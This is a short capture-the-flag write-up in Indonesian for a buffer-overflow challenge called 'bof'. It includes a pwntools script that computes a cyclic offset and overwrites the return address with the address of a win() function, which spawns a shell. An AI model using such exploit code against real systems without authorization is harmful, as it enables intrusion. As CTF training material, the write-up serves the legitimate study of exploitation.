# bof
---
A Simple bof for you!
nc challenges.traboda.com 8031
# Solver
---
Diberikan sebuah file c dan binary. Ini overflow biasa karena tidak adanya PIE. Terdapat fungsi ```win()``` yang akan membuat shell. Yaudah tinggal cari offset untuk overflow ditambah address dari ```win()``` . Scrtiptnya berikut
```
from pwn import *
chall = ELF("./chall")
p = process("./chall")
#00000000004011b6 <win>:
win = p64(0x00000000004011b6)
pattern = "A" * cyclic_find("kaaa")
p.recvuntil("Send it to me then......")
raw_input("GDB gan")
p.sendline(pattern +win)
p.interactive()
```